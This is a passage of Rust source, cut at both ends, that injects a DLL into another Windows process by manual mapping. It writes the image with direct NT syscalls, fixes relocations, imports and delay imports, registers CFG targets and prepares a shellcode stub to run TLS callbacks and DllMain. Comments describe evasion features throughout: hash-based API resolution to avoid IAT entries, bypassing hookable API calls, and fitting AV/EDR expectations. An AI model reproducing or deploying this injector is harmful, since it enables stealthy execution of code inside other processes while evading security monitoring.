        )?;

        let mut written = 0usize;
        let status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            target_process as u64,
            dest as u64,
            data.as_ptr() as u64,
            data.len() as u64,
            &mut written as *mut _ as u64,
        );

        let mut restore_dummy = 0u32;
        // Restore original protection even if the write failed.
        let _ = protect_remote(&mut prot_base, &mut prot_size, old_prot, &mut restore_dummy);

        if status.as_ref().map_or(true, |s| *s < 0) || written != data.len() {
            return Err(anyhow!(
                "NtWriteVirtualMemory failed at rva {rva:#x} (status={:?}, written={written:#x}, expected={:#x})",
                status,
                data.len()
            ));
        }
        Ok(())
    };

    // ── Step 2: copy PE headers ────────────────────────────────────────────
    let header_size = opt.windows_fields.size_of_headers as usize;
    write_remote(0, &dll_bytes[..header_size.min(dll_bytes.len())])?;

    // ── Step 2b: validate section layout ───────────────────────────────────
    // Reject PEs with overlapping virtual ranges — they are either corrupt
    // or crafted to trigger memory corruption when mapped.
    {
        let mut ranges: Vec<(usize, usize, &str)> = Vec::new();
        for section in &pe.sections {
            let va = section.virtual_address as usize;
            let vs = section.virtual_size as usize;
            if vs == 0 {
                continue;
            }
            let name = section.name().unwrap_or("???");
            let end = va.checked_add(vs).ok_or_else(|| {
                anyhow!(
                    "PE section '{}' virtual range overflow (va={:#x}, vs={:#x})",
                    name,
                    va,
                    vs
                )
            })?;
            for &(prev_va, prev_end, prev_name) in &ranges {
                if va < prev_end && end > prev_va {
                    return Err(anyhow!(
                        "PE sections '{}' [{:#x}..{:#x}) and '{}' [{:#x}..{:#x}) overlap",
                        prev_name,
                        prev_va,
                        prev_end,
                        name,
                        va,
                        end
                    ));
                }
            }
            ranges.push((va, end, name));
        }
    }

    // ── Step 3: copy sections ──────────────────────────────────────────────
    for section in &pe.sections {
        let raw_offset = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        if raw_offset.saturating_add(raw_size) > dll_bytes.len() {
            return Err(anyhow!(
                "section at raw offset {raw_offset:#x}+{raw_size:#x} exceeds dll_bytes length"
            ));
        }
        checked_image_range(section.virtual_address as usize, raw_size, image_size).ok_or_else(|| {
            anyhow!(
                "PE section virtual data (rva {:#x} + size {:#x}) exceeds image size {image_size:#x}",
                section.virtual_address,
                raw_size
            )
        })?;
        let section_data = &dll_bytes[raw_offset..raw_offset + raw_size];
        write_remote(section.virtual_address as usize, section_data)?;
    }

    // ── Step 3b: apply per-section memory protections ─────────────────────
    // The allocation was made as PAGE_READWRITE so we could write sections.
    // Now apply the same per-section policy as the local variant so sections
    // are never left RWX.  W+X is downgraded to RX; later write operations
    // temporarily re-enable RW via NtProtectVirtualMemory.
    for section in &pe.sections {
        let prot_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        if prot_size == 0 {
            continue;
        }
        let rva = section.virtual_address as usize;
        let ch = section.characteristics;
        let exec = ch & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = ch & IMAGE_SCN_MEM_READ != 0;
        let write = ch & IMAGE_SCN_MEM_WRITE != 0;
        let protect = match (exec, read, write) {
            (true, _, true) => PAGE_EXECUTE_READ,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };

        let mut target = (remote_base as usize + rva) as *mut c_void;
        let mut size = prot_size;
        let mut old = 0u32;
        protect_remote(&mut target, &mut size, protect, &mut old)?;
    }

    // ── Step 3c: register entry point + TLS callbacks as valid CFG call targets
    // When the target process has Control Flow Guard (CFG) enabled, indirect
    // calls to addresses not in the CFG bitmap trigger STATUS_STACK_BUFFER_OVERRUN
    // (0xC0000409) and terminate the process.  Since the injected DLL is not
    // loaded through the official loader, its entry point, exported functions,
    // and TLS callbacks are not in the CFG valid-call-target set.  We use
    // SetProcessValidCallTargets (available on Windows 10+) to add all of
    // them to the bitmap, preventing CFG-induced crashes before DllMain or
    // during TLS callback invocation.
    //
    // TLS callbacks are collected from the local PE bytes here (before remote
    // mapping) so CFG registration happens in one batch.  The TLS directory's
    // AddressOfCallBacks field stores absolute VAs relative to the preferred
    // image base; subtracting the preferred base yields the RVA needed by
    // SetProcessValidCallTargets (offset from VirtualAddress = remote_base).
    //
    // The function is resolved dynamically from kernelbase.dll via pe_resolve
    // (hash-based API resolution) to avoid adding IAT entries.  On older
    // Windows versions where the function is absent, this step is skipped
    // silently — those systems don't enforce CFG at kernel level anyway.
    #[cfg(target_arch = "x86_64")]
    {
        let kernelbase =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernelbase.dll\0"));
        if let Some(base) = kernelbase {
            let fn_addr = pe_resolve::get_proc_address_by_hash(
                base,
                pe_resolve::hash_str(b"SetProcessValidCallTargets\0"),
            );
            if let Some(addr) = fn_addr {
                // BOOL SetProcessValidCallTargets(
                //   HANDLE hProcess,
                //   PVOID  VirtualAddress,
                //   SIZE_T RegionSize,
                //   ULONG  NumberOfOffsets,
                //   PCFG_CALL_TARGET_INFO OffsetInformation
                // );
                type SetProcessValidCallTargetsFn = unsafe extern "system" fn(
                    *mut c_void,              // HANDLE hProcess
                    *mut c_void,              // PVOID VirtualAddress
                    usize,                    // SIZE_T RegionSize
                    u32,                      // ULONG NumberOfOffsets
                    *const CfgCallTargetInfo, // PCFG_CALL_TARGET_INFO
                )
                    -> i32; // BOOL

                #[repr(C)]
                struct CfgCallTargetInfo {
                    offset: usize,
                    flags: usize,
                }

                const CFG_CALL_TARGET_VALID: usize = 0x00000001;
                const CFG_CALL_TARGET_CONVERT_EXPORT_SUPPRESSED_TO_VALID: usize = 0x00000004;

                let entry_rva = opt.standard_fields.address_of_entry_point as usize;

                // Collect TLS callback RVAs from the local PE image.
                // The TLS directory AddressOfCallBacks is a VA (preferred_base + rva).
                // Subtract preferred_base to get the RVA offset for CFG registration.
                let preferred_base_u = preferred_base as usize;
                let mut cfg_offsets: Vec<usize> = Vec::new();
                if entry_rva != 0 {
                    cfg_offsets.push(entry_rva);
                }
                const IMAGE_DIRECTORY_ENTRY_TLS_CFG: usize = 9;
                if let Some(tls_entry) = opt.data_directories.data_directories
                    [IMAGE_DIRECTORY_ENTRY_TLS_CFG]
                    .map(|(_, dd)| dd)
                {
                    if tls_entry.virtual_address != 0 && tls_entry.size > 0 {
                        let tls_dir_rva = tls_entry.virtual_address as usize;
                        // IMAGE_TLS_DIRECTORY64 (PE32+) layout:
                        //   StartAddressOfRawData  : u64 (offset 0)
                        //   EndAddressOfRawData    : u64 (offset 8)
                        //   AddressOfIndex         : u64 (offset 16)
                        //   AddressOfCallBacks     : u64 (offset 24)
                        //   SizeOfZeroFill         : u32 (offset 32)
                        //   Characteristics        : u32 (offset 36)
                        if tls_dir_rva + 40 <= image_size {
                            // Convert the TLS directory RVA to a raw file offset.
                            // Using the RVA directly as a byte index is only correct
                            // when VirtualAddress == PointerToRawData for every section,
                            // which the PE spec does not guarantee.
                            if let Some(tls_dir_offset) =
                                rva_to_file_offset(&pe.sections, tls_dir_rva)
                            {
                                if tls_dir_offset + 40 <= dll_bytes.len() {
                                    let callbacks_va = u64::from_le_bytes(
                                        dll_bytes[tls_dir_offset + 24..tls_dir_offset + 32]
                                            .try_into()
                                            .unwrap_or([0u8; 8]),
                                    )
                                        as usize;
                                    if callbacks_va != 0 && preferred_base_u != 0 {
                                        let callbacks_rva =
                                            callbacks_va.wrapping_sub(preferred_base_u);
                                        // Walk the null-terminated callback array from local PE bytes.
                                        // Convert the callback-array RVA to a file offset too.
                                        if let Some(mut cb_file_offset) =
                                            rva_to_file_offset(&pe.sections, callbacks_rva)
                                        {
                                            let mut guard = 32u32;
                                            while guard > 0 && cb_file_offset + 8 <= dll_bytes.len()
                                            {
                                                guard -= 1;
                                                let cb_va = u64::from_le_bytes(
                                                    dll_bytes[cb_file_offset..cb_file_offset + 8]
                                                        .try_into()
                                                        .unwrap_or([0u8; 8]),
                                                )
                                                    as usize;
                                                if cb_va == 0 {
                                                    break;
                                                }
                                                let cb_rva = cb_va.wrapping_sub(preferred_base_u);
                                                // Validate: RVA must be within image.
                                                if cb_rva < image_size {
                                                    cfg_offsets.push(cb_rva);
                                                }
                                                cb_file_offset += 8;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                let call_target_infos: Vec<CfgCallTargetInfo> = cfg_offsets
                    .iter()
                    .map(|&offset| CfgCallTargetInfo {
                        offset,
                        flags: CFG_CALL_TARGET_VALID
                            | CFG_CALL_TARGET_CONVERT_EXPORT_SUPPRESSED_TO_VALID,
                    })
                    .collect();

                if !call_target_infos.is_empty() {
                    let set_cfg_targets: SetProcessValidCallTargetsFn = std::mem::transmute(addr);
                    let result = unsafe {
                        set_cfg_targets(
                            target_process as *mut c_void,
                            remote_base,
                            image_size,
                            call_target_infos.len() as u32,
                            call_target_infos.as_ptr(),
                        )
                    };
                    if result == 0 {
                        tracing::debug!(
                            "remote_manual_map: SetProcessValidCallTargets returned FALSE \
                             ({} targets, entry_rva={:#x}); CFG may not be enabled or access denied",
                            call_target_infos.len(),
                            entry_rva
                        );
                    } else {
                        tracing::debug!(
                            "remote_manual_map: registered {} CFG call targets (entry_rva={:#x}, {} TLS callbacks)",
                            call_target_infos.len(),
                            entry_rva,
                            call_target_infos.len() - if entry_rva != 0 { 1 } else { 0 }
                        );
                    }
                }
            }
            // If SetProcessValidCallTargets is not available (pre-Win10),
            // CFG enforcement is not present, so no action needed.
        }
    }

    // ── Step 4a: compute and apply base relocations ────────────────────────
    // All patches are computed in a local buffer then written remotely.
    let base_delta = remote_base as isize - preferred_base;
    if base_delta != 0 {
        let reloc_dir = opt.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
            .map(|(_, dd)| dd)
            .filter(|dir| dir.virtual_address != 0 && dir.size > 0)
            .ok_or_else(|| {
                anyhow!(
                    "remote_manual_map: allocated at {:#x} instead of preferred base {:#x}, but PE has no relocation directory",
                    remote_base as usize,
                    preferred_base
                )
            })?;
        let reloc_rva = reloc_dir.virtual_address as usize;
        let reloc_size = reloc_dir.size as usize;
        checked_image_range(reloc_rva, reloc_size, image_size).ok_or_else(|| {
            anyhow!(
                "remote_manual_map: relocation directory out of image bounds (rva={:#x}, size={:#x}, image={:#x})",
                reloc_rva,
                reloc_size,
                image_size
            )
        })?;

        // Read the relocation directory from the remote image.
        let mut reloc_data = vec![0u8; reloc_size];
        let mut bytes_read = 0usize;
        let reloc_read_status = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            target_process as u64,
            (remote_base as usize + reloc_rva) as u64,
            reloc_data.as_mut_ptr() as u64,
            reloc_size as u64,
            &mut bytes_read as *mut _ as u64,
        );
        if reloc_read_status.as_ref().map_or(true, |s| *s < 0) || bytes_read != reloc_size {
            return Err(anyhow!(
                "NtReadVirtualMemory for reloc directory failed: status={:?}",
                reloc_read_status
            ));
        }

        let mut offset = 0usize;
        while offset + 8 <= reloc_size {
            let page_rva =
                u32::from_le_bytes(reloc_data[offset..offset + 4].try_into().unwrap()) as usize;
            let block_size =
                u32::from_le_bytes(reloc_data[offset + 4..offset + 8].try_into().unwrap()) as usize;
            if block_size < 8 || offset + block_size > reloc_size {
                return Err(anyhow!(
                    "remote_manual_map: malformed relocation block at offset {offset:#x} (block_size={block_size:#x}, reloc_size={reloc_size:#x})"
                ));
            }
            let entries_count = (block_size - 8) / 2;
            let entries_start = offset + 8;
            for i in 0..entries_count {
                let off = entries_start + i * 2;
                let entry = u16::from_le_bytes(reloc_data[off..off + 2].try_into().unwrap());
                let reloc_type = (entry >> 12) as u8;
                let reloc_offset = (entry & 0x0FFF) as usize;
                let field_rva = page_rva
                    .checked_add(reloc_offset)
                    .ok_or_else(|| anyhow!("remote_manual_map: relocation target RVA overflow"))?;

                match reloc_type {
                    // IMAGE_REL_BASED_DIR64: 64-bit absolute VA (x64, ARM64)
                    10 => {
                        checked_image_range(field_rva, 8, image_size).ok_or_else(|| {
                            anyhow!(
                                "remote_manual_map: DIR64 relocation target out of image bounds (rva={:#x}, image={:#x})",
                                field_rva,
                                image_size
                            )
                        })?;
                        let mut buf = [0u8; 8];
                        let mut n = 0usize;
                        let src = (remote_base as usize + field_rva) as u64;
                        let read_status = nt_syscall::syscall!(
                            "NtReadVirtualMemory",
                            target_process as u64,
                            src,
                            buf.as_mut_ptr() as u64,
                            8u64,
                            &mut n as *mut _ as u64,
                        );
                        if read_status.as_ref().map_or(true, |s| *s < 0) || n != 8 {
                            return Err(anyhow!(
                                "NtReadVirtualMemory(reloc DIR64 @ {:#x}) failed: status={:?}, read={}",
                                field_rva,
                                read_status,
                                n
                            ));
                        }
                        let val = i64::from_le_bytes(buf);
                        let patched = (val as isize + base_delta).to_le_bytes();
                        write_remote(field_rva, &patched)?;
                    }
                    // IMAGE_REL_BASED_HIGHLOW: 32-bit absolute VA (x86)
                    3 => {
                        checked_image_range(field_rva, 4, image_size).ok_or_else(|| {
                            anyhow!(
                                "remote_manual_map: HIGHLOW relocation target out of image bounds (rva={:#x}, image={:#x})",
                                field_rva,
                                image_size
                            )
                        })?;
                        let mut buf = [0u8; 4];
                        let mut n = 0usize;
                        let src = (remote_base as usize + field_rva) as u64;
                        let read_status = nt_syscall::syscall!(
                            "NtReadVirtualMemory",
                            target_process as u64,
                            src,
                            buf.as_mut_ptr() as u64,
                            4u64,
                            &mut n as *mut _ as u64,
                        );
                        if read_status.as_ref().map_or(true, |s| *s < 0) || n != 4 {
                            return Err(anyhow!(
                                "NtReadVirtualMemory(reloc HIGHLOW @ {:#x}) failed: status={:?}, read={}",
                                field_rva,
                                read_status,
                                n
                            ));
                        }
                        let val = i32::from_le_bytes(buf);
                        let patched = ((val as isize + base_delta) as i32).to_le_bytes();
                        write_remote(field_rva, &patched)?;
                    }
                    0 => {} // padding
                    _ => {
                        tracing::warn!(
                            "remote_manual_map: skipping unhandled reloc type \
                             {reloc_type} at page_rva+offset {field_rva:#x}"
                        );
                    }
                }
            }
            offset += block_size;
        }
    }

    // ── Step 4b: resolve IAT ──────────────────────────────────────────────
    // Two resolution paths:
    //
    // Fast path (remote_module_map is None):
    //   The shared-ASLR assumption holds — system DLLs share a single
    //   per-boot ASLR base across all processes (copy-on-write physical pages).
    //   Resolving via PEB walk in OUR process yields correct remote addresses.
    //
    // Safe path (remote_module_map is Some):
    //   Shared-ASLR verification failed (ntdll mismatch or critical DLL
    //   mismatch, e.g. cross-session / WoW64 layout differences).
    //   Use the Toolhelp module map to obtain each DLL's actual remote base,
    //   then read its export table via ReadProcessMemory to find function RVAs.
    //   This ensures every IAT entry holds a valid remote-process address.
    //   If a required import DLL is not yet loaded in the remote process,
    //   it is loaded on-demand via LdrLoadDll (mirroring the delay-import path).
    let iat_entry_size = if opt.standard_fields.magic == 0x20B {
        std::mem::size_of::<u64>()
    } else {
        std::mem::size_of::<u32>()
    };

    // Prepare mutable remote module map + LdrLoadDll address for the safe
    // path so that missing DLLs can be loaded on-demand.
    let mut safe_remote_modules: Option<(HashMap<String, usize>, usize)> = None;

    for import in &pe.imports {
        let proc_addr: usize = if let Some(ref rmod) = remote_module_map {
            // Safe path: resolve from the remote process's actual module base.
            // Lazy-initialise the mutable map + LdrLoadDll address on first use.
            if safe_remote_modules.is_none() {
                let ldr_addr = resolve_remote_ldr_load_dll(target_process, rmod)?;
                safe_remote_modules = Some((rmod.clone(), ldr_addr));
            }
            let (ref mut smap, ldr_addr) = safe_remote_modules.as_mut().unwrap();
            let dll_lower = import.dll.to_ascii_lowercase();
            let remote_dll_base =
                ensure_remote_module_loaded_cached(target_process, &dll_lower, *ldr_addr, smap)?;
            if import.name.starts_with("ORDINAL ") {
                // Ordinal import: resolve by ordinal from the remote export table.
                resolve_remote_export_by_ordinal(target_process, remote_dll_base, import.ordinal)?
            } else {
                resolve_remote_export(target_process, remote_dll_base, import.name.as_ref())?
            }
        } else {
            // Fast path: resolve locally via PEB walk + clean export table.
            // M-26: avoid hookable GetModuleHandleA / GetProcAddress IAT entries.
            if import.name.starts_with("ORDINAL ") {
                // Ordinal import: resolve locally by ordinal.
                let dll_name_cstr = std::ffi::CString::new(import.dll)
                    .map_err(|_| anyhow!("import DLL name contains NUL: {}", import.dll))?;
                let dll_hash = pe_resolve::hash_str(dll_name_cstr.to_bytes_with_nul());
                let mod_base = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(0);
                if mod_base == 0 {
                    return Err(anyhow!(
                        "PEB-walk failed for '{}': not loaded in current process",
                        import.dll
                    ));
                }
                let addr =
                    get_proc_address_by_ordinal_manual(mod_base as *mut c_void, import.ordinal);
                if addr.is_null() {
                    return Err(anyhow!(
                        "PEB-walk ordinal export resolution failed for ordinal {} in '{}'",
                        import.ordinal,
                        import.dll
                    ));
                }
                addr as usize
            } else {
                let dll_name_cstr = std::ffi::CString::new(import.dll)
                    .map_err(|_| anyhow!("import DLL name contains NUL: {}", import.dll))?;
                let fn_name_cstr = std::ffi::CString::new(import.name.as_ref())
                    .map_err(|_| anyhow!("import function name contains NUL: {}", import.name))?;

                let dll_hash = pe_resolve::hash_str(dll_name_cstr.to_bytes_with_nul());
                let mod_base = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(0);
                if mod_base == 0 {
                    return Err(anyhow!(
                        "PEB-walk failed for '{}': not loaded in current process",
                        import.dll
                    ));
                }
                let fn_hash = pe_resolve::hash_str(fn_name_cstr.to_bytes_with_nul());
                let addr = pe_resolve::get_proc_address_by_hash(mod_base, fn_hash).unwrap_or(0);
                if addr == 0 {
                    return Err(anyhow!(
                        "PEB-walk export resolution failed for '{}' in '{}'",
                        import.name,
                        import.dll
                    ));
                }
                addr
            }
        };

        // Write the resolved function pointer into the remote IAT slot.
        if iat_entry_size == std::mem::size_of::<u64>() {
            let iat_addr_bytes = (proc_addr as u64).to_le_bytes();
            write_remote(import.rva, &iat_addr_bytes)?;
        } else {
            let proc_addr32 = u32::try_from(proc_addr).map_err(|_| {
                anyhow!(
                    "remote_manual_map: import '{}' from '{}' resolved above 32-bit range: {proc_addr:#x}",
                    import.name,
                    import.dll
                )
            })?;
            write_remote(import.rva, &proc_addr32.to_le_bytes())?;
        }
    }

    // ── Step 4c: resolve delay imports ───────────────────────────────────
    // Delay import descriptors are not surfaced by goblin's normal import
    // iterator, so parse IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT directly from the
    // remote image and eagerly populate the delay IAT. This mirrors the local
    // loader's behavior and avoids first-use crashes in the target process.
    if let Some(delay_dir) = opt.data_directories.data_directories
        [IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT_REMOTE]
        .map(|(_, dd)| dd)
    {
        if delay_dir.virtual_address != 0 && delay_dir.size > 0 {
            let delay_rva = delay_dir.virtual_address as usize;
            let delay_size = delay_dir.size as usize;
            let delay_range = checked_image_range(delay_rva, delay_size, image_size).ok_or_else(|| {
                anyhow!(
                    "remote_manual_map: delay-import directory out of image bounds (rva={:#x}, size={:#x}, image={:#x})",
                    delay_rva,
                    delay_size,
                    image_size
                )
            })?;

            let mut delay_remote_modules = match remote_module_map.clone() {
                Some(map) => map,
                None => build_remote_module_map(target_process).map_err(|e| {
                    anyhow!(
                        "remote_manual_map: delay imports require remote module enumeration: {}",
                        e
                    )
                })?,
            };
            let ldr_load_dll_addr =
                resolve_remote_ldr_load_dll(target_process, &delay_remote_modules)?;

            let is_pe32_plus = opt.standard_fields.magic == 0x20B;
            let thunk_entry_size = if is_pe32_plus {
                std::mem::size_of::<u64>()
            } else {
                std::mem::size_of::<u32>()
            };
            let ordinal_flag_mask: u64 = if is_pe32_plus { 1u64 << 63 } else { 1u64 << 31 };
            let rva_mask: u64 = if is_pe32_plus {
                0x7FFF_FFFF_FFFF_FFFF
            } else {
                0x7FFF_FFFF
            };

            let mut desc_rva = delay_range.start;
            while desc_rva + DELAY_IMPORT_DESCRIPTOR_SIZE <= delay_range.end {
                let desc = read_remote_exact(
                    target_process,
                    remote_base as usize + desc_rva,
                    DELAY_IMPORT_DESCRIPTOR_SIZE,
                    "remote_manual_map delay-import descriptor",
                )?;
                let grattrs = u32::from_le_bytes(desc[0x00..0x04].try_into().unwrap());
                let dll_name_field =
                    u32::from_le_bytes(desc[0x04..0x08].try_into().unwrap()) as usize;
                let hmod_field = u32::from_le_bytes(desc[0x08..0x0C].try_into().unwrap()) as usize;
                let iat_field = u32::from_le_bytes(desc[0x0C..0x10].try_into().unwrap()) as usize;
                let int_field = u32::from_le_bytes(desc[0x10..0x14].try_into().unwrap()) as usize;

                if dll_name_field == 0 && hmod_field == 0 && iat_field == 0 && int_field == 0 {
                    break;
                }
                if dll_name_field == 0 {
                    break;
                }

                let fields_are_rvas = grattrs & 0x1 != 0;
                let field_to_rva = |value: usize, field_name: &str| -> Result<usize> {
                    if value == 0 {
                        return Ok(0);
                    }
                    if fields_are_rvas {
                        checked_image_range(value, 1, image_size).ok_or_else(|| {
                            anyhow!(
                                "remote_manual_map: delay-import {} RVA {:#x} is outside image size {:#x}",
                                field_name,
                                value,
                                image_size
                            )
                        })?;
                        return Ok(value);
                    }
                    let rva = value.checked_sub(remote_base as usize).ok_or_else(|| {
                        anyhow!(
                            "remote_manual_map: delay-import {} VA {:#x} is below remote image base {:#x}",
                            field_name,
                            value,
                            remote_base as usize
                        )
                    })?;
                    checked_image_range(rva, 1, image_size).ok_or_else(|| {
                        anyhow!(
                            "remote_manual_map: delay-import {} VA {:#x} maps outside remote image (base={:#x}, image={:#x})",
                            field_name,
                            value,
                            remote_base as usize,
                            image_size
                        )
                    })?;
                    Ok(rva)
                };

                let dll_name_rva = field_to_rva(dll_name_field, "DLL name")?;
                let hmod_rva = field_to_rva(hmod_field, "HMODULE")?;
                let iat_rva = field_to_rva(iat_field, "IAT")?;
                let int_rva = field_to_rva(int_field, "INT")?;

                let dll_name = read_remote_c_string_from_image(
                    target_process,
                    remote_base as usize,
                    dll_name_rva,
                    image_size,
                    260,
                    "remote_manual_map delay-import DLL name",
                )?;
                let remote_dll_base = ensure_remote_module_loaded_cached(
                    target_process,
                    &dll_name,
                    ldr_load_dll_addr,
                    &mut delay_remote_modules,
                )?;

                let thunk_base_rva = if int_rva != 0 { int_rva } else { iat_rva };
                if thunk_base_rva == 0 || iat_rva == 0 {
                    return Err(anyhow!(
                        "remote_manual_map: delay-import descriptor for {} has invalid thunk/IAT RVAs (INT={:#x}, IAT={:#x})",
                        dll_name,
                        int_rva,
                        iat_rva
                    ));
                }

                let mut slot_idx = 0usize;
                loop {
                    if slot_idx > 4096 {
                        return Err(anyhow!(
                            "remote_manual_map: delay-import thunk walk for {} exceeded safety cap",
                            dll_name
                        ));
                    }
                    let thunk_rva = thunk_base_rva
                        .checked_add(slot_idx.checked_mul(thunk_entry_size).ok_or_else(|| {
                            anyhow!("remote_manual_map: delay-import thunk index overflow")
                        })?)
                        .ok_or_else(|| {
                            anyhow!("remote_manual_map: delay-import thunk RVA overflow")
                        })?;
                    let iat_slot_rva = iat_rva
                        .checked_add(slot_idx.checked_mul(thunk_entry_size).ok_or_else(|| {
                            anyhow!("remote_manual_map: delay-import IAT index overflow")
                        })?)
                        .ok_or_else(|| {
                            anyhow!("remote_manual_map: delay-import IAT RVA overflow")
                        })?;

                    if checked_image_range(thunk_rva, thunk_entry_size, image_size).is_none()
                        || checked_image_range(iat_slot_rva, thunk_entry_size, image_size).is_none()
                    {
                        break;
                    }

                    let thunk_bytes = read_remote_exact(
                        target_process,
                        remote_base as usize + thunk_rva,
                        thunk_entry_size,
                        "remote_manual_map delay-import thunk",
                    )?;
                    let thunk_val = if is_pe32_plus {
                        u64::from_le_bytes(thunk_bytes.try_into().unwrap())
                    } else {
                        u32::from_le_bytes(thunk_bytes.try_into().unwrap()) as u64
                    };
                    if thunk_val == 0 {
                        break;
                    }

                    let proc_addr = if thunk_val & ordinal_flag_mask != 0 {
                        let ordinal = (thunk_val & 0xFFFF) as u16;
                        resolve_remote_export_by_ordinal(target_process, remote_dll_base, ordinal)?
                    } else {
                        let ibn_rva = (thunk_val & rva_mask) as usize;
                        checked_image_range(ibn_rva, 2, image_size).ok_or_else(|| {
                            anyhow!(
                                "remote_manual_map: delay-import {} slot {} has out-of-range IMAGE_IMPORT_BY_NAME RVA {:#x}",
                                dll_name,
                                slot_idx,
                                ibn_rva
                            )
                        })?;
                        let function_name = read_remote_c_string_from_image(
                            target_process,
                            remote_base as usize,
                            ibn_rva + 2,
                            image_size,
                            512,
                            "remote_manual_map delay-import function name",
                        )?;
                        resolve_remote_export(target_process, remote_dll_base, &function_name)?
                    };

                    if is_pe32_plus {
                        write_remote(iat_slot_rva, &(proc_addr as u64).to_le_bytes())?;
                    } else {
                        let proc_addr32 = u32::try_from(proc_addr).map_err(|_| {
                            anyhow!(
                                "remote_manual_map: delay import from {} resolved above 32-bit range: {proc_addr:#x}",
                                dll_name
                            )
                        })?;
                        write_remote(iat_slot_rva, &proc_addr32.to_le_bytes())?;
                    }

                    slot_idx += 1;
                }

                if hmod_rva != 0 {
                    checked_image_range(hmod_rva, thunk_entry_size, image_size).ok_or_else(|| {
                        anyhow!(
                            "remote_manual_map: delay-import HMODULE slot for {} is out of image bounds (rva={:#x})",
                            dll_name,
                            hmod_rva
                        )
                    })?;
                    if is_pe32_plus {
                        write_remote(hmod_rva, &(remote_dll_base as u64).to_le_bytes())?;
                    } else {
                        let base32 = u32::try_from(remote_dll_base).map_err(|_| {
                            anyhow!(
                                "remote_manual_map: delay import module {} base exceeds 32-bit range: {remote_dll_base:#x}",
                                dll_name
                            )
                        })?;
                        write_remote(hmod_rva, &base32.to_le_bytes())?;
                    }
                }

                desc_rva += DELAY_IMPORT_DESCRIPTOR_SIZE;
            }
        }
    }

    // ── Step 4d: flush instruction cache ─────────────────────────────────
    // The CPU may have stale cached instruction bytes from before we wrote
    // the PE image, applied relocations, and fixed the IAT.  Flush the
    // entire mapped region in the target process so the remote thread always
    // executes coherent code.  NtFlushInstructionCache is a no-op on x86/x64
    // (coherency is guaranteed by hardware) but it is the documented pattern
    // for portable correctness and satisfies AV/EDR expectations.
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        target_process as u64,
        remote_base as u64,
        image_size as u64,
    );

    // ── Step 4d: collect TLS callback addresses from the remote image ────
    // After relocation the TLS directory's AddressOfCallBacks field points to
    // a null-terminated array of function VAs inside the mapped image.  We
    // read the array from the remote process so the shellcode stub can call
    // each callback with DLL_PROCESS_ATTACH before DllMain.
    //
    // We also collect the static TLS fields (AddressOfIndex,
    // StartAddressOfRawData, EndAddressOfRawData, SizeOfZeroFill) so the
    // shellcode stub can perform full static TLS initialisation before
    // invoking callbacks or DllMain.
    //
    // IMAGE_DIRECTORY_ENTRY_TLS = 9
    #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
    let mut tls_callback_vas: Vec<usize> = Vec::new();
    #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
    let mut static_tls_index_ptr: usize = 0;
    #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
    let mut static_tls_data_start: usize = 0;
    #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
    let mut static_tls_data_end: usize = 0;
    #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
    let mut static_tls_zero_fill: u32 = 0;
    #[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
    {
        const IMAGE_DIRECTORY_ENTRY_TLS_REMOTE: usize = 9;
        if let Some(tls_entry) = opt.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_TLS_REMOTE]
            .map(|(_, dd)| dd)
        {
            if tls_entry.virtual_address != 0 && tls_entry.size > 0 {
                // IMAGE_TLS_DIRECTORY64 layout (40 bytes on PE32+ x64/ARM64):
                //   StartAddressOfRawData  : u64  (offset 0)
                //   EndAddressOfRawData    : u64  (offset 8)
                //   AddressOfIndex         : u64  (offset 16)
                //   AddressOfCallBacks     : u64  (offset 24)
                //   SizeOfZeroFill         : u32  (offset 32)
                //   Characteristics        : u32  (offset 36)
                let tls_dir_va = remote_base as usize + tls_entry.virtual_address as usize;
                let mut tls_dir_buf = [0u8; 40];
                let mut n = 0usize;
                let read_status = nt_syscall::syscall!(
                    "NtReadVirtualMemory",
                    target_process as u64,
                    tls_dir_va as u64,
                    tls_dir_buf.as_mut_ptr() as u64,
                    40u64,
                    &mut n as *mut _ as u64,
                );
                if read_status.map_or(false, |s| s >= 0) && n == 40 {
                    let data_start_va =
                        u64::from_le_bytes(tls_dir_buf[0..8].try_into().unwrap()) as usize;
                    let data_end_va =
                        u64::from_le_bytes(tls_dir_buf[8..16].try_into().unwrap()) as usize;
                    let index_ptr_va =
                        u64::from_le_bytes(tls_dir_buf[16..24].try_into().unwrap()) as usize;
                    let callbacks_va =
                        u64::from_le_bytes(tls_dir_buf[24..32].try_into().unwrap()) as usize;
                    let zero_fill = u32::from_le_bytes(tls_dir_buf[32..36].try_into().unwrap());

                    // Store static TLS fields for shellcode stub generation.
                    if index_ptr_va != 0 {
                        static_tls_index_ptr = index_ptr_va;
                        static_tls_data_start = data_start_va;
                        static_tls_data_end = data_end_va;
                        static_tls_zero_fill = zero_fill;
                    }

                    if callbacks_va != 0 {
                        // Walk the null-terminated callback array.
                        let mut remaining = 32u32; // defensive cap
                        let mut slot_ptr = callbacks_va as *const u64;
                        loop {
                            if remaining == 0 {
                                break;
                            }
                            remaining -= 1;
                            let mut cb_buf = [0u8; 8];
                            let mut cb_read = 0usize;
                            let s = nt_syscall::syscall!(
                                "NtReadVirtualMemory",
                                target_process as u64,
                                slot_ptr as u64,
                                cb_buf.as_mut_ptr() as u64,
                                8u64,
